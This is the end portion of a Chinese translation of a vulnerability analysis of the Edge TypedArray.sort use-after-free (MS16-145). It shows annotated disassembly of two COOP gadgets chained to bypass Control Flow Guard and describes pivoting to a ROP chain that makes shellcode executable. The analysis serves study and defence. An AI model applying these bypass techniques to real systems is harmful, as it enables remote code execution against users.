.text:0000000180089D43&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[r11+10h],&nbsp;rdx
.text:0000000180089D47&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[r11+8],&nbsp;rcx
.text:0000000180089D4B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsp,&nbsp;38h
.text:0000000180089D4F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,&nbsp;[rcx]
.text:0000000180089D52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8,&nbsp;rdx
.text:0000000180089D55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,&nbsp;[r11-18h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//second&nbsp;argument&nbsp;is&nbsp;the&nbsp;address&nbsp;of&nbsp;a&nbsp;local&nbsp;variable
.text:0000000180089D59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,&nbsp;[rax+2E8h]
.text:0000000180089D60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;cs:__guard_dispatch_icall_fptr&nbsp;&nbsp;&nbsp;//call&nbsp;second&nbsp;COOP&nbsp;gadget
.text:0000000180089D66&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;ecx
.text:0000000180089D68&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;rax,&nbsp;rax
.text:0000000180089D6B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setnz&nbsp;&nbsp;&nbsp;cl
.text:0000000180089D6E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;ecx
.text:0000000180089D70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsp,&nbsp;38h
.text:0000000180089D74&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn
.text:0000000180089D74&nbsp;public:&nbsp;virtual&nbsp;int&nbsp;Js::DynamicObjectEnumerator&lt;int,&nbsp;1,&nbsp;1,&nbsp;1&gt;::MoveNext(unsigned&nbsp;char&nbsp;*)&nbsp;endp</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们制作一个假的虚拟桌面，使间接调用引用第二个COOP部件；对于第二个函数，我选择了edgehtml！CRTCMediaStreamTrackStats :: WriteSnapshotForTelemetry。第二个函数将EAX寄存器的内容写入第二个参数指向的结构的偏移量0x18处，这样就可以覆盖第一个函数的返回地址了：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">.text:000000018056BF90&nbsp;;&nbsp;void&nbsp;__fastcall&nbsp;CRTCMediaStreamTrackStats::WriteSnapshotForTelemetry(CRTCMediaStreamTrackStats&nbsp;*__hidden&nbsp;this,&nbsp;struct&nbsp;TelemetryStats::BaseTelemetryStats&nbsp;*)
.text:000000018056BF90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[rcx+30h]
.text:000000018056BF93&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx+4],&nbsp;eax
.text:000000018056BF96&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[rcx+34h]
.text:000000018056BF99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx+8],&nbsp;eax
.text:000000018056BF9C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,&nbsp;[rcx+38h]
.text:000000018056BFA0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx+10h],&nbsp;rax
.text:000000018056BFA4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[rcx+40h]
.text:000000018056BFA7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx+18h],&nbsp;eax&nbsp;&nbsp;&nbsp;//writes&nbsp;to&nbsp;offset&nbsp;0x18&nbsp;of&nbsp;the&nbsp;structure&nbsp;pointed&nbsp;by&nbsp;the&nbsp;2nd&nbsp;argument&nbsp;==&nbsp;overwrites&nbsp;return&nbsp;address
.text:000000018056BFAA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[rcx+44h]
.text:000000018056BFAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx+1Ch],&nbsp;eax
.text:000000018056BFB0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[rcx+4Ch]
.text:000000018056BFB3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx+20h],&nbsp;eax
.text:000000018056BFB6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[rcx+50h]
.text:000000018056BFB9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx+24h],&nbsp;eax
.text:000000018056BFBC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn
.text:000000018056BFBC&nbsp;?WriteSnapshotForTelemetry@CRTCMediaStreamTrackStats@@MEBAXPEAUBaseTelemetryStats@TelemetryStats@@@Z&nbsp;endp</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在反汇编CRTCMediaStreamTrackStats :: WriteSnapshotForTelemetry函数的代码中可以看出，用于覆盖返回地址的qword来自RCX + 0x40 / RCX + 0x44，这意味着它是具有假的vtable的对象的成员，因此它可以被攻击者完全控制。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当退出第一个COOP函数时，会覆盖返回地址，所以，我们就绕过了Control Flow Guard。我们使用堆栈旋转部件的地址作为覆盖返回地址的值； 这样，我们只需启动一个传统的ROP链，它将调用EShims！NS_ACGLockdownTelemetry :: APIHook_VirtualProtect，为我们的shellcode提供可执行权限，从而远程执行代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">小结</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ArrayBuffer对象一直是不同网络浏览器的各种UAF漏洞的源泉，Edge中的Chakra引擎也不例外。事实上，ArrayBuffer构造函数可以使用两个不同的分配器（malloc或VirtualAlloc），加上我们可以根据要创建的ArrayBuffer的长度来控制使用哪一个的事实，从而在尝试利用漏洞方面提供了便利。如果我们唯一的选择是将底层缓冲区分配给CRT堆，漏洞的利用可能会更难一些。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了将相对R / W原语转换为绝对R / W，获得损坏的整数数组的基址是难点。为此，我们需要弄清楚如何滥用Quicksort来进行精确的元素交换。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，这篇博文的最后一部分展示了伪面向对象编程（COOP）的实际应用，我们通过利用两个有效的C ++虚拟函数设法绕过了Control Flow Guard：chakra！Js :: DynamicObjectEnumerator &lt;int，1 ，1，1&gt; :: MoveNext和edgehtml！CRTCMediaStreamTrackStats :: WriteSnapshotForTelemetry。它们可以进行链接以覆盖前者的返回地址，从而绕过CFG。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">致谢</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">非常感谢我的同事SébastienRenaud和Jean-BaptisteBédrune在百忙之中帮我审阅了这篇文章。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考文献&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">[1]<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=983" _src="https://bugs.chromium.org/p/project-zero/issues/detail?id=983">https://bugs.chromium.org/p/project-zero/issues/detail?id=983</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[2]<a href="https://technet.microsoft.com/library/security/ms16-145" _src="https://technet.microsoft.com/library/security/ms16-145">https://technet.microsoft.com/library/security/ms16-145</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[3]<a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=257597" _src="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=257597">https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=257597</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[4]<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/sort" _src="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/sort">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/sort</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[5]<a href="https://msdn.microsoft.com/en-us/library/4xc60xas.aspx" _src="https://msdn.microsoft.com/en-us/library/4xc60xas.aspx">https://msdn.microsoft.com/en-us/library/4xc60xas.aspx</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[6]<a href="https://labs.bluefrostsecurity.de/publications/2016/08/28/look-mom-i-dont-use-shellcode/" _src="https://labs.bluefrostsecurity.de/publications/2016/08/28/look-mom-i-dont-use-shellcode/">https://labs.bluefrostsecurity.de/publications/2016/08/28/look-mom-i-dont-use-shellcode/</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[7]<a href="https://en.wikipedia.org/wiki/Quicksort#Repeated_elements" _src="https://en.wikipedia.org/wiki/Quicksort#Repeated_elements">https://en.wikipedia.org/wiki/Quicksort#Repeated_elements</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[8]<a href="https://en.wikipedia.org/wiki/Quicksort" _src="https://en.wikipedia.org/wiki/Quicksort">https://en.wikipedia.org/wiki/Quicksort</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[9]<a href="https://github.com/lattera/glibc/blob/master/stdlib/qsort.c" _src="https://github.com/lattera/glibc/blob/master/stdlib/qsort.c">https://github.com/lattera/glibc/blob/master/stdlib/qsort.c</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[10]<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort#Description" _src="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort#Description">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort#Description</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[11]<a href="http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf" _src="http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf">http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[12]<a href="http://www.slideshare.net/_s_n_t/object-oriented-exploitation-new-techniques-in-windows-mitigation-bypass" _src="http://www.slideshare.net/_s_n_t/object-oriented-exploitation-new-techniques-in-windows-mitigation-bypass">http://www.slideshare.net/_s_n_t/object-oriented-exploitation-new-techniques-in-windows-mitigation-bypass</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[13]<a href="https://twitter.com/_s_n_t" _src="https://twitter.com/_s_n_t">https://twitter.com/_s_n_t</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[14]	<a href="https://triton.quarkslab.com/" _src="https://triton.quarkslab.com/">https://triton.quarkslab.com/</a>&nbsp;</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html" target="_blank">原文链接：http://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【漏洞分析】MS16-145：Edge浏览器TypedArray.sort UAF漏洞分析 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3816" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="13879" user-name="Ping溢" href="javascript:;">
                Ping溢            </a>
                        <span class="comment-time">2017-05-08 10:43:12</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13879">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13879" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">这份漏洞利用方案的代码有一些地方还需要修改，利用方案实际上并不优雅</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3816" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
